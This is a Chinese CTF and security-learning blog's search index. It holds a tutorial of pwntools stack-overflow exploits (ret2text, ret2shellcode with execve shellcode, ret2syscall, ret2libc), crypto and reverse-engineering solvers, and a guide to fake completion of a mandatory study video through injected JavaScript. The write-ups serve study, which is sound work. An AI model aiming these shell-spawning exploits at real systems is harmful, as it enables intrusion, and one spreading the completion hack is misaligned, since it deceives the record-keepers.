<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>优雅的大学习</title>
    <link href="/2020/05/28/202005281032/"/>
    <url>/2020/05/28/202005281032/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Author: Mag1c (unkn0wn)</p></blockquote><blockquote><p>技术部分不是Mag1c原创，但是我看到没有大佬整理整个操作过程，对外行人士不太友好，因此Mag1c整理、简化了整套操作流程</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>懂得自然懂，不敢解释（最近视频都将近10分钟。。。）</p><h2 id="ios系统"><a href="#ios系统" class="headerlink" title="ios系统"></a>ios系统</h2><blockquote><p>ipad，iphone经测试均可，Jobs the great！</p></blockquote><p><a href="https://www.bilibili.com/s/video/BV1zA411q7hS" target="_blank" rel="noopener">一个up主的操作视频</a></p><p>打开大学习，点击开始学习后，下拉进入系统快捷菜单，并拖动播放进度条。</p><p><a href="https://imgchr.com/i/tVUTR1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/28/tVUTR1.png" srcset="/img/loading.gif" alt="tVUTR1.png"></a></p><h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>android系统相对复杂，但是肯定比十分钟短得多得多得多吧</p><p>首先，把以下信息复制到你自己的微信（建议发给自己）</p><pre><code>第一步 debugmm.qq.com/?forcex5=true 第二步 http://debugtbs.qq.com 第三步 http://debugx5.qq.comdocument.getElementById(&#39;Bvideo&#39;).currentTime=600;</code></pre><p>点击第一个网址，然后退出</p><p>点击第二个网址，</p><p><a href="https://imgchr.com/i/tVanWn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/28/tVanWn.md.jpg" srcset="/img/loading.gif" alt="tVanWn.md.jpg"></a><br>出现下面的界面，说明一切顺利</p><p>退出，点击第三个网址</p><p>切到信息，勾选打开vConsole调试</p><p><a href="https://imgchr.com/i/tVaRSI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/28/tVaRSI.md.jpg" srcset="/img/loading.gif" alt="tVaRSI.md.jpg"></a><br>just like this</p><p>配置部分完成，上面这一套操作也就一两分钟吧，而且以后就不需要上面的操作了。</p><p>接下来进入常规部分，然后，复制最后的一行代码</p><p>进入大学习，不要点开始学习！！</p><p><a href="https://imgchr.com/i/tV0hOx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/28/tV0hOx.md.jpg" srcset="/img/loading.gif" alt="tV0hOx.md.jpg"></a></p><p>打开vConsole，把代码粘贴进去，不要点OK！！然后回到视频</p><p><a href="https://imgchr.com/i/tVBCtg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/28/tVBCtg.md.jpg" srcset="/img/loading.gif" alt="tVBCtg.md.jpg"></a></p><p>点击开始学习，再次打开console，点OK，大功告成！</p><p><a href="https://imgchr.com/i/tVBKNF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/28/tVBKNF.md.jpg" srcset="/img/loading.gif" alt="tVBKNF.md.jpg"></a></p><p>然后我们就发现自己已经到了答题环节</p><p><a href="https://imgchr.com/i/tVD9Dx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/28/tVD9Dx.md.jpg" srcset="/img/loading.gif" alt="tVD9Dx.md.jpg"></a></p><p>检查学习记录和积分记录，发现没有问题</p><p>亲测一套下来也就不到三分钟，配置完成以后更是半分钟就能搞定，新时代的青年最重要的就是无穷的创造力！</p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="Q1-时长不会记录？"><a href="#Q1-时长不会记录？" class="headerlink" title="Q1 时长不会记录？"></a>Q1 时长不会记录？</h3><p>A：不会，系统只会上传完成，而且你答完题就是完成</p><h3 id="Q2-答题的意义？"><a href="#Q2-答题的意义？" class="headerlink" title="Q2 答题的意义？"></a>Q2 答题的意义？</h3><p>A: 从目前辽宁省的统计来看，应该是只统计完成，答题不正确也不影响完成，如果有很多同学需要正确率，以后我会更新自动答题的方法。</p><h3 id="Q3-作者的政治正确？"><a href="#Q3-作者的政治正确？" class="headerlink" title="Q3 作者的政治正确？"></a>Q3 作者的政治正确？</h3><p>A: 作者是从小受共产主义思想教育长大，坚信马克思主义，未来也有志于为共产主义事业出力的中国青年。但是，马克思主义也要求我们有自己的思想，邓小平同志也教导我们要反对形式主义；如果你不喜欢这些，你可以坚持自己的价值观，没必要攻击我的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GKCTF2020 部分wp</title>
    <link href="/2020/05/25/202005251634/"/>
    <url>/2020/05/25/202005251634/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本次GKCTF对re属实不太友好，在短时间内这几个re还真的不太好弄（还是我太菜了）</p></blockquote><h2 id="re-check-in"><a href="#re-check-in" class="headerlink" title="re check_in"></a>re check_in</h2><p>进入程序，找到密码HelloWorld，进入程序之后进flag，提示去玩打砖块，游戏结束后弹出flag。</p><h2 id="crypto-babycrypto"><a href="#crypto-babycrypto" class="headerlink" title="crypto babycrypto"></a>crypto babycrypto</h2><p>已知高位的coopersmith，几乎是原题，代码如下</p><pre><code class="python"># 用sage运行n =0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005p_fake =0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000#pbits = 2048pbits = p_fake.nbits()#kbits = 900kbits = 128  #p失去的低位pbar = p_fake &amp; (2^pbits-2^kbits)print &quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.3p= x0 + pbarprint p</code></pre><p>求出p后解rsa</p><pre><code class="python">import gmpy2import base64n=0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005c = 1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361p = 160734387026849747944319274262095716650717626398118440194223452208652532694713113062084219512359968722796763029072117463281356654614167941930993838521563406258263299846297499190884495560744873319814150988520868951045961906000066805136724505347218275230562125457122462589771119429631727404626489634314291445667q=n//pe = 0x10001phi_n = (p-1)*(q-1)d = gmpy2.invert(e, phi_n)n=p*qm = pow(c, d, n)print(hex(m))flag = str(hex(m))[2:]print &#39;hex:&#39;+flagprint &#39;str:&#39;+flag.decode(&#39;hex&#39;)</code></pre><h2 id="crypto-小学生的密码学"><a href="#crypto-小学生的密码学" class="headerlink" title="crypto 小学生的密码学"></a>crypto 小学生的密码学</h2><p>affine，网上脚本一堆</p><h2 id="crypto-汉字的秘密（unsolved）"><a href="#crypto-汉字的秘密（unsolved）" class="headerlink" title="crypto 汉字的秘密（unsolved）"></a>crypto 汉字的秘密（unsolved）</h2><p>吃了没文化的亏，比完赛后才知道是当铺密码。然后逐位+1、+2…</p><p>当铺密码：出头数量代表数字，如由代表1，土代表5</p><h2 id="misc-签到"><a href="#misc-签到" class="headerlink" title="misc 签到"></a>misc 签到</h2><p>略</p><h2 id="misc-Pokemon"><a href="#misc-Pokemon" class="headerlink" title="misc Pokemon"></a>misc Pokemon</h2><p>GBA模拟器玩游戏，到103道路可以看到flag，小技巧是可以用pkhex改数据打NPC。</p><h2 id="code-obfuscation-unsolved"><a href="#code-obfuscation-unsolved" class="headerlink" title="code obfuscation (unsolved)"></a>code obfuscation (unsolved)</h2><p>最近对二维码很感兴趣，不过绘制二维码还是费劲…</p><p>附上一个大佬绘制的</p><p><img src="C31BDFFCAE744F3FBA15694C2543E553" srcset="/img/loading.gif" alt="image"></p><p>然后是个base58</p><p>再然后还在看</p><h2 id="8-re-babydriver（solved-after-game"><a href="#8-re-babydriver（solved-after-game" class="headerlink" title="8 re babydriver（solved after game)"></a>8 re babydriver（solved after game)</h2><p>这个题流程分析倒是不难，很容易看出是个迷宫问题，但是驱动的输入不是ascii码这一点是真的之前不知道，驱动输入应该是键盘扫描码</p><p><img src="D16E7A15B8E24F58A477D07349BE2176" srcset="/img/loading.gif" alt="image"></p><p>得知这个之后就可以按照迷宫走，最后得出input</p><p>flag是input的md5，计算得出flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn入门（1）basicROP</title>
    <link href="/2020/05/11/202005111717/"/>
    <url>/2020/05/11/202005111717/</url>
    
    <content type="html"><![CDATA[<blockquote><p>萌新开始了自己的pwn学习（感觉团队进步速度不够，准备带头拓展一下业务）接下来一段时间我将会抽出时间学习pwn，首先按照ctf wiki完成知识学习。</p></blockquote><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出(stack overflow)指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p><p>发生栈溢出的前提：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><p>输入函数：gets,scanf,vscanf</p><p>输出函数：sprintf</p><p>字符串：strcpy，strcat，bcopy</p><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>确定变量到栈底的距离</p><blockquote><p>下面，我们用几个例子入门rop</p></blockquote><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">题目地址</a></p><p>函数中存在gets，怀疑栈溢出漏洞</p><p>存在 system(“/bin/sh”)，因此可以直接控制程序返回，payload如下：</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./te&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passsys_addr=0x804863apayload = &quot;A&quot;*0x6c+&#39;a&#39;*4 + p32(sys_addr)def choose2():    #p.recvuntil(&quot;please input\n&quot;)  这个在一般情况是需要添加的  可是这个题不知道为什么添加就不执行shell了        p.recvuntil(&quot;anything?\n&quot;)        p.sendline(payload)#raw_input()  用来断在开始的位置#gdb.attach(p)  可以用动态调试    p.interactive()choose2()</code></pre><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>shellcode是一串汇编代码，主要功能是获取目标系统的shell，一般来说需要我们自己填充shell，填充shell需要一段可执行的空间。</p><p>下面来看<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">例题</a></p><p>仍然是gets函数，这次没有控制函数，但是有一段可执行的bss，写入shellcode</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./te&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passshellcode = &quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;bss_addr=0x804a080payload = shellcode.ljust(112,&#39;a&#39;) + p32(bss_addr)def choose2():    #p.recvuntil(&quot;please input\n&quot;)  这个在一般情况是需要添加的  可是这个题不知道为什么添加就不执行shell了        p.recvuntil(&quot;!!!\n&quot;)        p.sendline(payload)#raw_input()  用来断在开始的位置#gdb.attach(p)  可以用动态调试    p.interactive()choose2() </code></pre><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>返回一串系统调用，系统调用示例如下：</p><pre><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></pre><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./te&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passp1=0x80bb196p2=0x806eb90s1=0x80be408sys=0x8049421payload=&#39;A&#39;*0x6c+&#39;a&#39;*4+p32(p1)+p32(0xb)+p32(p2)+p32(0)+p32(0)+p32(s1)+p32(sys)def choose2():        p.recvuntil(&quot;do?\n&quot;)        p.sendline(payload)#raw_input()  用来断在开始的位置#gdb.attach(p)  可以用动态调试    p.interactive()choose2()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">题目地址</a></p><p>返回执行system函数即可</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *sh = process(&#39;./ret2libc1&#39;)binsh_addr = 0x8048720system_plt = 0x08048460payload = flat([&#39;a&#39; * 112, system_plt, &#39;b&#39; * 4, binsh_addr])sh.sendline(payload)sh.interactive()</code></pre><h3 id="构造字符串"><a href="#构造字符串" class="headerlink" title="构造字符串"></a>构造字符串</h3><p>这道题中没有”/bin/sh”，我们需要手动把这个字符串输进程序</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./ret2libc2&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passgets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([&#39;a&#39; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])def choose2():        p.recvuntil(&quot;What do you think ?&quot;)        p.sendline(payload)        # gdb.attach(p)  # 可以用动态调试        p.sendline(&quot;/bin/sh&quot;)#raw_input()  用来断在开始的位置    p.interactive()choose2()</code></pre><h3 id="libc与随机地址"><a href="#libc与随机地址" class="headerlink" title="libc与随机地址"></a>libc与随机地址</h3><p>仍然是gets函数的栈溢出，去掉了system函数的地址。</p><p>基本的dump地址找libc库的思路</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./ret2libc3&#39;)    #bin = ELF(&#39;./&#39;,checksec=False)    #libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,checksec=False)else:    p=remote(&#39;111.198.29.45&#39;,43732)    #bin = ELF(&#39;./&#39;,checksec=False)    #libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,checksec=False)    passret2libc3 = ELF(&#39;./ret2libc3&#39;)puts_plt=0x8048460main_addr=0x8048618puts_got=ret2libc3.got[&#39;puts&#39;]payload=112*&#39;a&#39;+p32(puts_plt)+p32(main_addr)+p32(puts_got)def choose2():        p.recvuntil(&quot;Can you find it !?&quot;)        p.sendline(payload)        puts_addr = u32(p.recv()[0:4])        libc = LibcSearcher(&#39;puts&#39;,puts_addr)        libc_base = puts_addr - libc.dump(&#39;puts&#39;)        system_addr = libc_base + libc.dump(&#39;system&#39;)        binsh = libc_base + libc.dump(&#39;str_bin_sh&#39;)        # p.recvuntil(&quot;!?&quot;)        p.sendline(&#39;a&#39;*104+p32(system_addr)+p32(0x08048618)+p32(binsh))        # gdb.attach(p)    # raw_input()  用来断在开始的位置    p.interactive()choose2()</code></pre>]]></content>
    
    
    <categories>
      
      <category>pwn学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crypto入门 buuctf刷题记录（1）</title>
    <link href="/2020/05/11/202005111715/"/>
    <url>/2020/05/11/202005111715/</url>
    
    <content type="html"><![CDATA[<blockquote><p>有大佬给我推荐了buuctf平台，去平台学习，记录一些有意思的。</p></blockquote><h2 id="rabbit"><a href="#rabbit" class="headerlink" title="rabbit"></a>rabbit</h2><p><a href="https://files.buuoj.cn/files/3aebe57d15403d745e63e964e670e3e5/bfdb217e-b914-4314-9a1b-a26a286475a3.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzZ9.XqaHDA.0qXtLx8neFbE4rbMkS110Pw88NU" target="_blank" rel="noopener">题目地址</a></p><p>一种叫做rabbit的流密码，本题在线解密即可。</p><h2 id="密码学的心声"><a href="#密码学的心声" class="headerlink" title="密码学的心声"></a>密码学的心声</h2><p><a href="https://files.buuoj.cn/files/e4f12b8c336823c121a7a70f5c481025/93ffdda9-7931-4753-aee3-0c05df7bc9b5.bmp?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxODN9.XqaRrw.ddujMakK1LDJ1nlaoGDiH92KGoE" target="_blank" rel="noopener">题目地址</a></p><p>看到了一个曲谱,由于所有数字都小于8，考虑八进制组合，3个一组，得出flag</p><h2 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h2><p><a href="https://files.buuoj.cn/files/96f4e049df1e4a9bffcea9820c8acda3/attachment.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxNzg4fQ.XqpBOg.JupE0Zueil2C15oyys2785iERtw" target="_blank" rel="noopener">题目地址</a></p><p>根据题目描述，首先判断出是新与佛论禅</p><p>得出一堆富强民主文明和谐，猜测是核心价值观加密</p><p>得到一串字母和doyouknowfence</p><p>栅栏密码，推到4时发现doyouknowcaesar</p><p>凯撒的本意是移位3，所以得出一串字母</p><p>字母由大写的26个字母和2-7组成，很可能是base32</p><p>得出flag</p><h2 id="2018CISCN-oldstreaming"><a href="#2018CISCN-oldstreaming" class="headerlink" title="2018CISCN oldstreaming"></a>2018CISCN oldstreaming</h2><p><a href="https://files.buuoj.cn/files/36826b80bcc36bb17715b68057117573/attachment.bz2?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzA0fQ.XqgDxw.95ktAz9823n5DqnCDE-4Ap6D3Ak" target="_blank" rel="noopener">题目地址</a></p><p>LFSR线性移位反馈寄存器，具体知识参考ctf wiki相关章节</p><p>2^32的范围，按常理来说爆破可行，但我们选择一个更有意义的解法，比特分析：</p><p>根据输出的前31位，可以确定key的最低位，然后递推即可。</p><pre><code>flag{926201d7}</code></pre><h2 id="坏蛋是雷宾"><a href="#坏蛋是雷宾" class="headerlink" title="坏蛋是雷宾"></a>坏蛋是雷宾</h2><p>rabin算法基础题，了解rabin原理，爆破得出结果。</p><pre><code class="python">n=523798549c=162853095for i in range(0,523798549):    if pow(i,2)%n==c:        print i# 115739001# 214318436# 309480113# 408059548</code></pre><p>爆破得出四个结果，转换二进制后六位是否为110001，确认309480113符合条件，移除后六位后即为明文。</p>]]></content>
    
    
    <categories>
      
      <category>CTF题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GUET-ctf2019 re</title>
    <link href="/2020/05/11/202005111714/"/>
    <url>/2020/05/11/202005111714/</url>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>无，<a href="https://files.buuoj.cn/files/a83068d825343ba3c969ac5f79f9d39c/attachment.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjo1ODN9.XqqqGQ.SWvE5L6tkr3ohbe_lKfYjkl_RQM" target="_blank" rel="noopener">题目地址</a></p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><blockquote><p>这道题本身没太大难度，记录这道题的目的是记录一下之前提到的z3库的使用</p></blockquote><p>脱掉upx壳，直接解密就可以，用一下z3库提高效率：</p><pre><code class="python">from z3 import *s = Solver()a1 = [0]*32for i in range(32):    a1[i] = Int(&#39;a1[&#39;+str(i)+&#39;]&#39;)s.add( 1629056 * a1[0] == 166163712 )s.add( 6771600 * a1[1] == 731332800 )s.add( 3682944 * a1[2] == 357245568 )s.add( 10431000 * a1[3] == 1074393000 )s.add( 3977328 * a1[4] == 489211344 )s.add( 5138336 * a1[5] == 518971936 )s.add( 7532250 * a1[7] == 406741500 )s.add( 5551632 * a1[8] == 294236496 )s.add( 3409728 * a1[9] == 177305856 )s.add( 13013670 * a1[10] == 650683500 )s.add( 6088797 * a1[11] == 298351053 )s.add( 7884663 * a1[12] == 386348487 )s.add( 8944053 * a1[13] == 438258597 )s.add( 5198490 * a1[14] == 249527520 )s.add( 4544518 * a1[15] == 445362764 )s.add( 3645600 * a1[17] == 174988800 )s.add( 10115280 * a1[16] == 981182160 )s.add( 9667504 * a1[18] == 493042704 )s.add( 5364450 * a1[19] == 257493600 )s.add( 13464540 * a1[20] == 767478780 )s.add( 5488432 * a1[21] == 312840624 )s.add( 14479500 * a1[22] == 1404511500 )s.add( 6451830 * a1[23] == 316139670 )s.add( 6252576 * a1[24] == 619005024 )s.add( 7763364 * a1[25] == 372641472 )s.add( 7327320 * a1[26] == 373693320 )s.add( 8741520 * a1[27] == 498266640 )s.add( 8871876 * a1[28] == 452465676 )s.add( 4086720 * a1[29] == 208422720 )s.add( 9374400 * a1[30] == 515592000 )s.add(5759124 * a1[31] == 719890500)s.check()print(s.model())</code></pre><p>输出发现少了一位，直接爆破就可以，最终结果：flag{e165421110ba03099a1c039337}</p>]]></content>
    
    
    <categories>
      
      <category>CTF题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯2020 re</title>
    <link href="/2020/05/11/202005111707/"/>
    <url>/2020/05/11/202005111707/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这次的网鼎杯，四道re做出了两个windows的，android的脱壳弄了好久运行环境没搞定（对安卓逆向不熟悉，以后得多学一点安卓）,至于那个全场0 solve的android我根本就没想。</p></blockquote><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>假虚拟机逆向，手动走流程就可以走到最后</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>查壳，32bit，PE，无壳</p><p>传入一个114长度的数组，用switch进行一段处理，通过ida查看伪码，我们很容易分析出，先是输入一串字符串，每执行到8是对输入的字符串进行处理，每执行到1是给一个验证数组元素赋值，执行到7是比对验证数组，当全部比对正确时，可以写出flag脚本。</p><h3 id="求解思路"><a href="#求解思路" class="headerlink" title="求解思路"></a>求解思路</h3><p>了解流程后，我们开始逆向这个过程，题目中有几个位置是FFFFFF8A等数值，不是很了解，通过手动patch得出最终结果。</p><p>flag{757515121f3d478}</p><h2 id="bang（未解出）"><a href="#bang（未解出）" class="headerlink" title="bang（未解出）"></a>bang（未解出）</h2><blockquote><p>比赛期间弄环境是大忌，这次的失误也警示自己要学习一下android。</p></blockquote><p>很遗憾，这道几乎是签到题的题目由于我对android完全不了解而没能做出。</p><p>赛后通过fart完成脱壳，核心代码：</p><pre><code class="java">public void onClick(View paramAnonymousView)      {        String str = localEditText.getText().toString();        paramAnonymousView = paramBundle.getText().toString();        if (str.equals(paramAnonymousView))        {          MainActivity.showmsg(&quot;user is equal passwd&quot;);        }        else if ((str.equals(&quot;admin&quot;) &amp; paramAnonymousView.equals(&quot;pass71487&quot;)))        {          MainActivity.showmsg(&quot;success&quot;);          MainActivity.showmsg(&quot;flag is flag{borring_things}&quot;);        }        else        {          MainActivity.showmsg(&quot;wrong&quot;);        }</code></pre><p> flag{borring_things}</p><h2 id="jocker"><a href="#jocker" class="headerlink" title="jocker"></a>jocker</h2><blockquote><p>很难理解出题人最后让猜一步的心态。</p></blockquote><p>代码中有混淆和栈平衡破坏，不会改，但是也可以看到大部分流程</p><h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>首先输入flag，wrong函数对flag按奇偶位进行异或，减处理</p><p>omg函数，将变换后的函数和unk_4030C0进行比较，解出flag{fak3_alw35_sp_me!!}</p><pre><code class="python">a=[  102, 107, 99, 100,  127,    97, 103,  100,  59, 86,  107,   97, 123,  38,   59,    80, 99,  95,  77,  90,    113,   12, 55,102]str=&quot;&quot;for i in range(0,12):    a[i*2]=a[i*2]^(i*2)    a[i*2+1]=a[i*2+1]+i*2+1    str=str+chr(a[i*2])+chr(a[i*2+1])print(a)print(str)</code></pre><p>接下来开始动态调试encrypt函数，发现字符串与hahahaha_do_you_find_me?的前19位进行异或</p><pre><code class="python">str=[&#39;h&#39;,&#39;a&#39;,&#39;h&#39;,&#39;a&#39;,&#39;h&#39;,&#39;a&#39;,&#39;h&#39;,&#39;a&#39;,&#39;_&#39;,&#39;d&#39;,&#39;o&#39;,&#39;_&#39;,&#39;y&#39;,&#39;o&#39;,&#39;u&#39;,&#39;_&#39;,&#39;f&#39;,&#39;i&#39;,&#39;n&#39;,&#39;d&#39;,&#39;_&#39;,&#39;m&#39;,&#39;e&#39;,&#39;?&#39;]a=[ 0x0000000E, 0x0000000D, 0x00000009, 0x00000006, 0x00000013, 0x00000005, 0x00000058,0x00000056, 0x0000003E, 0x00000006, 0x0000000C, 0x0000003C, 0x0000001F, 0x00000057, 0x00000014,0x0000006B, 0x00000057, 0x00000059, 0x0000000D]ans=&quot;&quot;for i in range(0,len(a)):    str[i]=chr(ord(str[i])^a[i])    ans=ans+str[i]print(ans)</code></pre><p>得到flag{d07abccf8a410c，还剩下最后五位，随便把五位填上重新调试程序</p><p>查看finally函数，没发现什么验证和处理，但是看到了定义了五个数值，而且flag第一位就过不去检测！所以爆破不存在的。做题的时候就觉得这五个数是不会凭空出现的，于是尝试最后一个数值和’}’异或，得出的数值分别异或之前的几个数值，得出猜测的flag，correct！</p><p>flag{d07abccf8a410cb37a}</p><hr><blockquote><p>还有个不是re的也顺便写一下吧</p></blockquote><h2 id="boom（crypto）"><a href="#boom（crypto）" class="headerlink" 